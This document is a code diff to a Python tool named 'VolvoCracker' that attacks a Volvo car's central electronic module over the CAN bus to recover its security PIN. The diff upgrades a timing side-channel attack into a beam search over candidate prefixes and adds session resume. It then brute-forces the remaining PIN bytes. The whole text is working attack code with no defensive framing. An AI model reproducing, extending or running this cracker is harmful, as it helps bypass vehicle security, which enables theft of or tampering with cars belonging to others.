@@ -293,54 +293,88 @@ class VolvoCracker:
         return False, 0
 
     def crack_timing(self, known_bytes=0):
-        """Attempt to find the first few bytes using timing analysis."""
-        print(f"Starting Timing Attack for first 3 bytes...")
-        current_pin = [0]*6
+        """
+        Attempt to find the first few bytes using timing analysis.
+        Returns a list of candidate PINs (top probable prefixes).
+        """
+        log(f"Starting Timing Attack...")
+        
+        # We want to find bytes 0, 1, 2.
+        # Instead of greedy best-first, we keep top N at each stage.
+        
+        # Start with one empty PIN
+        candidates = [[0]*6] 
         
         for pos in range(known_bytes, 3):
-            print(f"Analyzing PIN byte {pos}...")
-            stats = {}
-            SAMPLES = 20
+            log(f"Analyzing PIN byte {pos} for {len(candidates)} branches...")
+            next_stage_candidates = []
             
-            for b_val_int in range(100):
-                b_val = BCD_TABLE[b_val_int]
-                current_pin[pos] = b_val
-                total_lat = 0
-                valid_samples = 0
+            for base_pin in candidates:
+                stats = {}
+                SAMPLES = 25 # Increased samples slightly
                 
-                for _ in range(SAMPLES):
-                    if pos + 1 < 6:
-                        current_pin[pos+1] = BCD_TABLE[random.randint(0, 99)]
+                # Test all 00-99 values for this position
+                for b_val_int in range(100):
+                    b_val = BCD_TABLE[b_val_int]
+                    current_pin = list(base_pin)
+                    current_pin[pos] = b_val
                     
-                    suc, lat = self.unlock_attempt_timing(current_pin)
-                    if suc:
-                        print(f"!!! ACCIDENTAL SUCCESS !!! PIN: {current_pin}")
-                        return current_pin
-                    if lat > 0:
-                        total_lat += lat
-                        valid_samples += 1
+                    total_lat = 0
+                    valid_samples = 0
+                    
+                    for _ in range(SAMPLES):
+                        # Randomize next byte for noise averaging
+                        if pos + 1 < 6:
+                            current_pin[pos+1] = BCD_TABLE[random.randint(0, 99)]
+                        
+                        suc, lat = self.unlock_attempt_timing(current_pin)
+                        if suc:
+                            log(f"!!! ACCIDENTAL SUCCESS !!! PIN: {current_pin}")
+                            return [current_pin]
+                        
+                        if lat > 0:
+                            total_lat += lat
+                            valid_samples += 1
+                    
+                    if valid_samples > 0:
+                        stats[b_val] = total_lat / valid_samples
                 
-                if valid_samples > 0:
-                    stats[b_val] = total_lat / valid_samples
+                # Sort by latency (descending)
+                sorted_candidates = sorted(stats.items(), key=lambda item: item[1], reverse=True)
+                
+                # Keep top 3 for this branch
+                top_n = sorted_candidates[:3]
+                log(f"Top 3 for prefix {base_pin[:pos]}+: {[hex(x[0]) for x in top_n]}")
+                
+                for byte_val, lat in top_n:
+                    new_pin = list(base_pin)
+                    new_pin[pos] = byte_val
+                    # Reset next bytes
+                    if pos + 1 < 6: new_pin[pos+1] = 0
+                    if pos + 2 < 6: new_pin[pos+2] = 0
+                    next_stage_candidates.append(new_pin)
             
-            sorted_candidates = sorted(stats.items(), key=lambda item: item[1], reverse=True)
-            if not sorted_candidates:
-                print("Timing attack failed. Aborting.")
-                return None
-                
-            best_byte = sorted_candidates[0][0]
-            print(f"Byte {pos} Match: {hex(best_byte)} (Lat: {sorted_candidates[0][1]*1000:.3f}ms)")
-            current_pin[pos] = best_byte
-            if pos + 1 < 6: current_pin[pos+1] = 0
+            # Keep overall top 5 to avoid explosion? 
+            # Or just keep all expanded branches (3^3 = 27 max). 27 * 1M = 27M. Too much.
+            # Let's prune.
+            # Actually, the timing score is absolute. We can sort ALL next_stage_candidates by their 'score' 
+            # if we propagated score. But here we just have ranks.
+            # Strategy: Keep max 5 candidates total per stage?
+            
+            candidates = next_stage_candidates
+            if len(candidates) > 5:
+                candidates = candidates[:5] # Prune to top 5 breadth
+        
+        log(f"Timing Attack Complete. Generated {len(candidates)} candidates.")
+        return candidates
 
-        return current_pin
-
-    def save_session(self, index, fixed_bytes):
+    def save_session(self, index, fixed_bytes, candidates_queue=None):
         try:
             state = {
                 "timestamp": time.time(),
                 "index": index,
-                "fixed_bytes": fixed_bytes
+                "fixed_bytes": fixed_bytes,
+                "candidates_queue": candidates_queue or []
             }
             tmp_file = SESSION_FILE + ".tmp"
             with open(tmp_file, "w") as f:
@@ -351,41 +385,27 @@ class VolvoCracker:
 
     def load_session(self):
         if not os.path.exists(SESSION_FILE):
-            return None, None
+            return None, None, []
         try:
             with open(SESSION_FILE, "r") as f:
                 state = json.load(f)
             idx = state.get("index", 0)
             fixed = state.get("fixed_bytes", [0]*6)
-            return max(0, idx - 500), fixed
+            queue = state.get("candidates_queue", [])
+            return max(0, idx - 500), fixed, queue
         except:
-            return None, None
+            return None, None, []
 
-    def brute_force(self, start_pin, start_index=0):
-        print(f"Starting Brute Force from index {start_index}...")
+    def brute_force(self, start_pin, start_index=0, candidates_queue=None):
+        log(f"Starting Brute Force from index {start_index}...")
         
-        # Pre-convert fixed bytes to ensure they are ints (if loaded from JSON)
-        # start_pin might be [0x12, 0x34, 0x56, 0, 0, 0]
-        # We assume bytes 0,1,2 are fixed.
-        
-        # Use a bytearray or list for mutable PIN to avoid allocation
-        # But we need BCD values.
         current_pin = list(start_pin)
-        
         total = 1000000
         start_t = time.time()
-        
-        # Reduce save frequency
         SAVE_INTERVAL = 2000 
         
         for i in range(start_index, total):
-            # Optimized math using lookup table
-            # i = 0..999999
-            # b3 = (i / 10000) % 100
-            # b4 = (i / 100) % 100
-            # b5 = i % 100
-            
-            # Use divmod for speed?
+            # Optimized iteration
             rem = i
             d1, rem = divmod(rem, 10000)
             d2, d3 = divmod(rem, 100)
@@ -399,22 +419,27 @@ class VolvoCracker:
                 rate = (i - start_index) / elapsed if elapsed > 0 else 0
                 remaining = total - i
                 eta = remaining / rate if rate > 0 else 0
-                print(f"Progress: {i}/{total} ({i/total*100:.1f}%) Rate: {rate:.1f}/s ETA: {eta/60:.1f}m - PIN: {current_pin}")
-                self.save_session(i, start_pin)
+                log(f"Progress: {i}/{total} ({i/total*100:.1f}%) Rate: {rate:.1f}/s ETA: {eta/60:.1f}m - PIN: {current_pin}")
+                self.save_session(i, start_pin, candidates_queue)
             
             if self.unlock_attempt_fast(current_pin):
-                print(f"\n!!! FOUND PIN: {current_pin} !!!")
+                log(f"\n!!! FOUND PIN: {current_pin} !!!")
                 if os.path.exists(SESSION_FILE): os.remove(SESSION_FILE)
                 return current_pin
                 
         return None
 
     def run(self):
+        # Boost Priority
+        try:
+            os.nice(-10)
+        except:
+            pass
+
         log("--- Volvo CEM Cracker (Pi Port Optimized) ---")
         if not self.setup_can(500000):
             return
             
-        # 0. Connectivity Check
         if not self.check_connection():
             log("Aborting due to connectivity failure.")
             return
@@ -423,43 +448,41 @@ class VolvoCracker:
         if pn: self.configure_for_cem(pn)
         else: log("Using Defaults.")
         
-        resume_index, resume_fixed_bytes = self.load_session()
+        resume_index, resume_fixed_bytes, candidates_queue = self.load_session()
         
-        start_fresh = True
+        current_fixed = None
         
+        # Resume Logic
         if resume_index is not None:
-            # Check if session is "finished" (i.e. index >= total)
-            if resume_index >= 1000000:
-                 log("Previous session finished without success.")
-                 # Maybe we should restart from scratch?
-                 log("Starting FRESH session.")
-                 if os.path.exists(SESSION_FILE): os.remove(SESSION_FILE)
+            # If previous session was mid-way
+            if resume_index < 1000000:
+                log(f"Resuming previous candidate from index {resume_index}...")
+                current_fixed = [int(x) for x in resume_fixed_bytes]
+                final_pin = self.brute_force(current_fixed, start_index=resume_index, candidates_queue=candidates_queue)
+                if final_pin: return
             else:
-                log(f"Resuming from index {resume_index}...")
-                partial_pin = [int(x) for x in resume_fixed_bytes]
-                start_idx = resume_index
-                start_fresh = False
-                
-                final_pin = self.brute_force(partial_pin, start_index=start_idx)
-                if final_pin:
-                    log("Done.")
-                    return
+                log("Previous candidate finished. Moving to next...")
         
-        if start_fresh:
-            log("New Session.")
-            partial_pin = self.crack_timing(known_bytes=0)
+        # Process Queue
+        if not candidates_queue and current_fixed is None:
+            log("Generating new candidates via Timing Attack...")
+            candidates_queue = self.crack_timing(known_bytes=0)
+            if not candidates_queue:
+                candidates_queue = [[0]*6] # Fallback
+        
+        # Iterate through candidates
+        while candidates_queue:
+            candidate = candidates_queue.pop(0)
+            candidate = [int(x) for x in candidate]
             
-            if partial_pin:
-                 log(f"Timing Attack Suggested: {partial_pin}")
-            else:
-                 log("Timing Attack Failed/Skipped. Defaulting to 00 00 00...")
-                 partial_pin = [0]*6
-                 
-            final_pin = self.brute_force(partial_pin, start_index=0)
+            log(f"Processing Candidate Prefix: {candidate[:3]}")
+            self.save_session(0, candidate, candidates_queue) # Save state before start
+            
+            final_pin = self.brute_force(candidate, start_index=0, candidates_queue=candidates_queue)
             if final_pin:
-                log("Done.")
-            else:
-                log("Finished range. No PIN found.")
+                return
+        
+        log("All candidates exhausted. No PIN found.")
 
 if __name__ == "__main__":
     VolvoCracker().run()
